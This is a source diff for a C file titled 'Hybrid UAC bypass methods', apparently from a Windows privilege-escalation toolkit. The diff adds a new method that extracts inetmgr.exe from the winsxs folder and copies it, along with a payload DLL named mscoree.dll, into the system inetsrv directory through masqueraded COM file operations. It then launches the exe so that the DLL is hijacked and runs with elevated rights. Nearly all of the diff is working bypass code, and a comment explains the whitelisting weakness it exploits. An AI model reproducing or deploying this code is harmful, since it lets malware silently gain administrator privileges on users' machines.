@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     2.20
+*  VERSION:     2.30
 *
-*  DATE:        25 May 2016
+*  DATE:        17 June 2016
 *
 *  Hybrid UAC bypass methods.
 *
@@ -289,7 +289,7 @@ BOOL ucmMMCMethod(
         _strcpy(szDest, g_ctx.szSystemDirectory);
         _strcat(szDest, lpTargetDll);
         if (PathFileExists(szDest)) {
-            OutputDebugString(L"[UCM] Target dll already exists, abort");
+            OutputDebugString(T_TARGETALREADYEXIST);
             break;
         }
 
@@ -576,7 +576,7 @@ BOOL ucmGWX(
 
         //File already exist, so IIS could be installed
         if (PathFileExists(szDest)) {
-            OutputDebugString(L"[UCM] Target dll already exists, abort");
+            OutputDebugString(T_TARGETALREADYEXIST);
             break;
         }
 
@@ -822,6 +822,223 @@ BOOL ucmAutoElevateManifest(
         _strcpy(szDest, g_ctx.szSystemDirectory);
         _strcat(szDest, lpApplication);
         bResult = supRunProcess(szDest, NULL);
+
+    } while (bCond);
+
+    return bResult;
+}
+
+/*
+* ucmInetMgrFindCallback
+*
+* Purpose:
+*
+* File search callback which does all the magic.
+*
+*/
+BOOL ucmInetMgrFindCallback(
+    WIN32_FIND_DATA *fdata, 
+    LPWSTR lpDirectory
+    )
+{
+    BOOL            bCond = FALSE, bSuccess = FALSE;
+    SIZE_T          l = 0;
+    HANDLE          hFile = INVALID_HANDLE_VALUE, hFileMapping = NULL;
+    PDWORD          MappedFile = NULL;
+    LARGE_INTEGER   FileSize;
+    CFILE_TYPE      ft;
+
+    PVOID           OutputBuffer = NULL;
+    SIZE_T          OutputBufferSize = 0;
+
+    WCHAR textbuf[MAX_PATH * 4];
+    WCHAR szDest[MAX_PATH * 2];
+ 
+    if (lpDirectory == NULL)
+        return FALSE;
+
+    do {
+        if (fdata->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+            break;
+
+        if (_strcmpi(fdata->cFileName, INETMGR_EXE) != 0)
+            break;
+
+        RtlSecureZeroMemory(&textbuf, sizeof(textbuf));
+        _strcpy(textbuf, lpDirectory);
+
+        l = _strlen(textbuf);
+        if (textbuf[l - 1] != L'\\') {
+            textbuf[l] = L'\\';
+            textbuf[l + 1] = 0;
+        }
+        _strcat(textbuf, fdata->cFileName);
+
+        hFile = CreateFile(textbuf, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
+        if (hFile == INVALID_HANDLE_VALUE)
+            break;
+
+        FileSize.QuadPart = 0;
+        if (!GetFileSizeEx(hFile, &FileSize))
+            break;
+
+        if (FileSize.QuadPart < 8)
+            break;
+
+        hFileMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
+        if (hFileMapping == NULL)
+            break;
+
+        MappedFile = MapViewOfFile(hFileMapping, PAGE_READWRITE, 0, 0, 0);
+        if (MappedFile == NULL)
+            break;
+
+        ft = GetTargetFileType(MappedFile);
+        if (ft == ftUnknown)
+            break;
+
+        switch (ft) {
+
+        case ftMZ: //win7            
+            bSuccess = ProcessFileMZ(MappedFile, (SIZE_T)FileSize.LowPart, &OutputBuffer, &OutputBufferSize);
+            break;
+
+        case ftDCN://win8     
+            bSuccess = ProcessFileDCN(MappedFile, (SIZE_T)FileSize.LowPart, &OutputBuffer, &OutputBufferSize);
+            break;
+
+        case ftDCS://win10   
+
+            if (InitCabinetDecompressionAPI()) {
+                bSuccess = ProcessFileDCS(MappedFile, (SIZE_T)FileSize.LowPart, &OutputBuffer, &OutputBufferSize);
+            }
+            break;
+
+        default:
+            break;
+
+        }
+
+        //is there any error processing files from winsxs?
+        if (!bSuccess)
+            break;
+
+        RtlSecureZeroMemory(&textbuf, sizeof(textbuf));
+        _strcpy(textbuf, g_ctx.szTempDirectory);
+        _strcat(textbuf, INETMGR_EXE);
+
+        bSuccess = supWriteBufferToFile(textbuf, OutputBuffer, (DWORD)OutputBufferSize);
+        if (!bSuccess)
+            break;
+
+        RtlSecureZeroMemory(&szDest, sizeof(szDest));
+        _strcpy(szDest, g_ctx.szSystemDirectory);
+        _strcat(szDest, INETSRV_DIR);
+        bSuccess = ucmMasqueradedCopyFileCOM(textbuf, szDest);
+        if (!bSuccess)
+            break;
+
+        _strcpy(textbuf, g_ctx.szTempDirectory);
+        _strcat(textbuf, MSCOREE_DLL);
+        bSuccess = supWriteBufferToFile(textbuf, g_ctx.PayloadDll, g_ctx.PayloadDllSize);
+        if (!bSuccess)
+            break;
+
+        bSuccess = ucmMasqueradedCopyFileCOM(textbuf, szDest);
+        if (!bSuccess)
+            break;
+
+        _strcat(szDest, INETMGR_EXE);
+        bSuccess = supRunProcess(szDest, NULL);
+
+    } while (bCond);
+
+
+    if (MappedFile != NULL)
+        UnmapViewOfFile(MappedFile);
+
+    if (hFileMapping != NULL)
+        CloseHandle(hFileMapping);
+
+    if (hFile != INVALID_HANDLE_VALUE)
+        CloseHandle(hFile);
+
+    if (OutputBuffer != NULL)
+        HeapFree(NtCurrentPeb()->ProcessHeap, 0, OutputBuffer);
+
+    return bSuccess;
+}
+
+/*
+* ucmInetMgrMethod
+*
+* Purpose:
+*
+* Since Windows 10 TH2 appinfo whitelist with full path two applications, which they were unable to redesign/move.
+* Sysprep.exe and inetmgr.exe (IIS). This was made in a favor of the UAC fix where was fixed 
+* WinSAT concept method, when you can copy autoelevated executables within windows folders to do all
+* required preparations for dll hijack. However InetMgr.exe does not exist in default windows setup. 
+* This component installed only if user choose to install IIS which most of people don't use at all. 
+* InetMgr component sits in winsxs folder (packed in win8+). We will simple use it (expand if needed) and abuse dll hijack 
+* as always directly with their hardcoded "safe" file path.
+*
+*/
+BOOL ucmInetMgrMethod(
+    VOID
+    )
+{
+    BOOL bResult = FALSE, bCond = FALSE;
+    WCHAR szBuffer[MAX_PATH * 2];
+    WCHAR szDirBuf[MAX_PATH * 2];
+    HANDLE hFindFile;
+    WIN32_FIND_DATA fdata;
+
+    do {
+
+        //target dir
+        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
+        _strcpy(szBuffer, g_ctx.szSystemDirectory);
+        _strcat(szBuffer, INETSRV_DIR);
+        _strcat(szBuffer, INETMGR_EXE);
+
+        //File already exist, so IIS could be installed
+        if (PathFileExists(szBuffer)) {
+            OutputDebugString(T_TARGETALREADYEXIST);
+            break;
+        }
+
+        RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
+        _strcpy(szBuffer, USER_SHARED_DATA->NtSystemRoot);
+        _strcat(szBuffer, L"\\winsxs\\");
+        
+        _strcpy(szDirBuf, szBuffer);
+        _strcat(szBuffer, L"*");
+
+        RtlSecureZeroMemory(&fdata, sizeof(fdata));
+        hFindFile = FindFirstFile(szBuffer, &fdata);
+        if (hFindFile != INVALID_HANDLE_VALUE) {
+
+            do {
+
+                if ((fdata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
+                    (fdata.cFileName[0] != L'.')
+                    )
+                {
+                    if (_strstri(fdata.cFileName, INETMGR_SXS) != NULL) {
+
+                        _strcpy(szBuffer, szDirBuf);
+                        _strcat(szBuffer, fdata.cFileName);
+                        bResult = supScanFiles(szBuffer, L"*.exe", (UCM_FIND_FILE_CALLBACK)&ucmInetMgrFindCallback);
+                        if (bResult)
+                            break;
+
+                    }
+                }
+
+            } while (FindNextFile(hFindFile, &fdata));           
+            
+            FindClose(hFindFile);
+        }
 
     } while (bCond);
 
